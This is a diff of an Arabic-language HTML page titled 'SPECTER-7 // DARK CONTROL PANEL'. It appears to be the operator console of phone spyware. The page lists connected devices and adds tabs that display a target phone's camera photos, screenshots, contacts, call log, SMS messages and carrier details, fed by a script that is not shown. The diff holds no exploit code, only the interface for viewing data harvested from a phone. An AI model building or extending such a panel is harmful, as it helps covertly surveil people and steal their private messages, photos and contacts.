@@ -1,177 +1,133 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>لوحة تحكم النظام الهندسية</title>
-    <style>
-        :root {
-            --bg: #0b0f12;
-            --panel: #12181f;
-            --border: #1e2631;
-            --accent: #00ffcc;
-            --yellow: #f39c12;
-            --text: #e0e6ed;
-            --muted: #8a99ad;
-            --danger: #e74c3c;
-        }
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: Tahoma, sans-serif;
-            margin: 0;
-            display: flex;
-            height: 100vh;
-        }
-        .sidebar {
-            width: 260px;
-            background: var(--panel);
-            border-left: 1px solid var(--border);
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-        }
-        .sidebar h2 {
-            color: var(--accent);
-            font-size: 18px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .device-selector {
-            background: #161f28;
-            border: 1px solid var(--border);
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-        }
-        .device-selector select {
-            width: 100%;
-            background: var(--bg);
-            color: var(--accent);
-            border: 1px solid var(--border);
-            padding: 8px;
-            border-radius: 4px;
-            font-family: Tahoma;
-        }
-        .menu-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .menu-btn {
-            background: transparent;
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 12px;
-            text-align: right;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .menu-btn.active, .menu-btn:hover {
-            background: var(--accent);
-            color: var(--bg);
-            font-weight: bold;
-            border-color: var(--accent);
-        }
-        .content {
-            flex: 1;
-            padding: 30px;
-            overflow-y: auto;
-        }
-        .tab-pane {
-            display: none;
-        }
-        .tab-pane.active {
-            display: block;
-        }
-        .file-item {
-            background: #161f28;
-            padding: 12px 15px;
-            margin-bottom: 8px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .file-item:hover {
-            border-color: var(--accent);
-        }
-        .file-info {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-        .file-size {
-            color: var(--yellow);
-            font-size: 12px;
-        }
-        .download-btn {
-            background: var(--accent);
-            color: var(--bg);
-            border: none;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .back-btn {
-            background: #1e2631;
-            color: var(--text);
-            border: 1px solid var(--border);
-            padding: 8px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DARK // CONTROL PANEL</title>
+<style>
+:root {
+    --bg: #030506;
+    --panel: #080d0f;
+    --green: #00ff88;
+    --blue: #00aaff;
+    --red: #ff174f;
+    --yellow: #ffeb3b;
+    --text: #e7f5f0;
+    --muted: #71847f;
+    --border: rgba(255,255,255,.07);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: "Segoe UI", Tahoma, sans-serif; min-height: 100vh; overflow-x: hidden; }
+header { position: sticky; top: 0; height: 68px; display: flex; align-items: center; justify-content: space-between; padding: 0 28px; background: rgba(5,8,10,.94); border-bottom: 1px solid rgba(0,255,136,.10); backdrop-filter: blur(15px); z-index: 50; }
+h1 { font-family: "Courier New", monospace; font-size: 17px; font-weight: 800; color: var(--green); text-shadow: 0 0 8px rgba(0,255,136,.35); }
+.header-actions { display: flex; align-items: center; gap: 10px; }
+.refresh-btn { background: rgba(0,255,136,.1); border: 1px solid rgba(0,255,136,.3); color: var(--green); padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; }
+.refresh-btn:hover { background: rgba(0,255,136,.2); }
+main { max-width: 1550px; margin: 0 auto; padding: 22px 24px; }
+.dashboard-grid { display: grid; grid-template-columns: 280px 1fr; gap: 20px; }
+.sidebar { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 15px; height: fit-content; }
+.sidebar select { width: 100%; background: #111; color: var(--yellow); padding: 10px; border: 1px solid var(--yellow); border-radius: 6px; margin-bottom: 15px; font-size: 14px; cursor: pointer; }
+.menu-list { display: flex; flex-direction: column; gap: 8px; }
+.menu-btn { background: #0f171a; color: var(--text); border: 1px solid var(--border); padding: 10px 12px; text-align: right; border-radius: 6px; cursor: pointer; font-size: 13px; transition: all 0.2s; }
+.menu-btn:hover, .menu-btn.active { background: rgba(0,255,136,.1); border-color: var(--green); color: var(--green); font-weight: bold; }
+.content-area { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 20px; min-height: 550px; }
+.tab-pane { display: none; }
+.tab-pane.active { display: block; }
+h3 { color: var(--yellow); font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+
+.gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; margin-top: 15px; }
+.gallery-item { background: #05080a; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; align-items: center; padding: 8px; transition: 0.2s; }
+.gallery-item:hover { border-color: var(--green); box-shadow: 0 0 10px rgba(0,255,136,.2); }
+.gallery-item img { width: 100%; height: 130px; object-fit: cover; border-radius: 4px; background: #111; margin-bottom: 8px; }
+.gallery-item a { background: var(--green); color: #000; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; width: 100%; text-align: center; }
+.gallery-item a:hover { background: #00cc6a; }
+
+table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+th, td { padding: 10px; text-align: right; border-bottom: 1px solid var(--border); font-size: 13px; }
+th { background: #0f171a; color: var(--yellow); }
+tr:hover { background: rgba(255,255,255,.01); }
+</style>
 </head>
 <body>
 
-    <div class="sidebar">
-        <h2>Dark Control</h2>
-        <div class="device-selector">
-            <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 5px;">الهاتف المتصل:</label>
-            <select id="deviceSelect" onchange="changeDevice()">
-                <option value="">جاري البحث عن أجهزة...</option>
+<header>
+    <h1>SPECTER-7 // DARK CONTROL PANEL</h1>
+    <div class="header-actions">
+        <button class="refresh-btn" onclick="window.location.reload()">🔄 تحديث الصفحة</button>
+    </div>
+</header>
+
+<main>
+    <div class="dashboard-grid">
+        <div class="sidebar">
+            <select id="deviceSelect" onchange="selectDevice(this.value)">
+                <option value="">جاري تحميل الأجهزة...</option>
             </select>
-            <div id="connectionStatus" style="font-size: 11px; margin-top: 5px; color: var(--danger);">● غير متصل</div>
-        </div>
-        <div class="menu-list">
-            <button class="menu-btn active" onclick="switchTab('filemanager')">📂 تصفح ملفات الهاتف</button>
-            <button class="menu-btn" onclick="switchTab('contacts')">📇 جهات الاتصال</button>
-            <button class="menu-btn" onclick="switchTab('calls')">📞 سجل المكالمات</button>
-            <button class="menu-btn" onclick="switchTab('messages')">📩 الرسائل القصيرة SMS</button>
-            <button class="menu-btn" onclick="switchTab('deviceinfo')">📱 معلومات الهاتف</button>
-        </div>
-    </div>
-
-    <div class="content">
-        <!-- تبويب مدير الملفات -->
-        <div id="filemanagerTab" class="tab-pane active">
-            <h3>مدير ملفات الهاتف (تصفح حي)</h3>
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-                <div style="color: var(--yellow);">المسار الحالي: <span id="currentPath">/storage/emulated/0/</span></div>
-                <button class="back-btn" onclick="goBack()">⬅ مجلد السابق</button>
-            </div>
-            <div id="fileListContainer">
-                <!-- العناصر ستُعرض هنا برمجياً -->
+            <div class="menu-list">
+                <button class="menu-btn active" onclick="switchTab('studio')">🖼️ معرض الاستديو (صور الكاميرا)</button>
+                <button class="menu-btn" onclick="switchTab('screenshots')">📸 لقطات الشاشة</button>
+                <button class="menu-btn" onclick="switchTab('contacts')">📇 جهات الاتصال</button>
+                <button class="menu-btn" onclick="switchTab('calls')">📞 سجل المكالمات</button>
+                <button class="menu-btn" onclick="switchTab('messages')">📩 الرسائل القصيرة SMS</button>
+                <button class="menu-btn" onclick="switchTab('network')">🌐 شبكة المشغل والاتصال</button>
             </div>
         </div>
 
-        <!-- تبويبات البيانات الأخرى -->
-        <div id="contactsTab" class="tab-pane"><h3>جهات الاتصال</h3><div id="contactsContent">جاري التحميل...</div></div>
-        <div id="callsTab" class="tab-pane"><h3>سجل المكالمات</h3><div id="callsContent">جاري التحميل...</div></div>
-        <div id="messagesTab" class="tab-pane"><h3>الرسائل القصيرة</h3><div id="messagesContent">جاري التحميل...</div></div>
-        
-        <!-- ** تبويب معلومات الهاتف ** -->
-        <div id="deviceinfoTab" class="tab-pane">
-            <h3>معلومات الهاتف</h3>
-            <div id="deviceInfoContent">جاري التحميل...</div>
+        <div class="content-area">
+            <!-- تبويب معرض الاستديو -->
+            <div id="studioTab" class="tab-pane active">
+                <h3>معرض الصور (DCIM / Camera)</h3>
+                <div id="studioGallery" class="gallery-grid">
+                    <p style="color: var(--muted);">بانتظار البيانات من الهاتف...</p>
+                </div>
+            </div>
+
+            <!-- تبويب لقطات الشاشة -->
+            <div id="screenshotsTab" class="tab-pane">
+                <h3>لقطات الشاشة (Screenshots)</h3>
+                <div id="screenshotsGallery" class="gallery-grid">
+                    <p style="color: var(--muted);">بانتظار البيانات من الهاتف...</p>
+                </div>
+            </div>
+
+            <!-- تبويب جهات الاتصال -->
+            <div id="contactsTab" class="tab-pane">
+                <h3>جهات الاتصال المخزنة</h3>
+                <table id="contactsTable">
+                    <thead><tr><th>الاسم</th><th>الرقم</th></tr></thead>
+                    <tbody><tr><td colspan="2" style="text-align:center; color: var(--muted);">بانتظار البيانات...</td></tr></tbody>
+                </table>
+            </div>
+
+            <!-- تبويب سجل المكالمات -->
+            <div id="callsTab" class="tab-pane">
+                <h3>سجل المكالمات</h3>
+                <table id="callsTable">
+                    <thead><tr><th>النوع / الحالة</th><th>التفاصيل / الرقم</th></tr></thead>
+                    <tbody><tr><td colspan="2" style="text-align:center; color: var(--muted);">بانتظار البيانات...</td></tr></tbody>
+                </table>
+            </div>
+
+            <!-- تبويب الرسائل -->
+            <div id="messagesTab" class="tab-pane">
+                <h3>الرسائل النصية (SMS)</h3>
+                <table id="messagesTable">
+                    <thead><tr><th>المرسل / المستقبل</th><th>نص الرسالة</th></tr></thead>
+                    <tbody><tr><td colspan="2" style="text-align:center; color: var(--muted);">بانتظار البيانات...</td></tr></tbody>
+                </table>
+            </div>
+
+            <!-- تبويب الشبكة -->
+            <div id="networkTab" class="tab-pane">
+                <h3>معلومات الشبكة والمشغل</h3>
+                <div id="networkInfo" style="padding: 15px; background: #05080a; border-radius: 6px; border: 1px solid var(--border);">
+                    <p>نوع الاتصال الحالي: <span id="netType" style="color: var(--yellow);">جاري التحقق...</span></p>
+                </div>
+            </div>
         </div>
     </div>
+</main>
 
-    <script src="script.js"></script>
+<script src="script.js"></script>
 </body>
 </html>
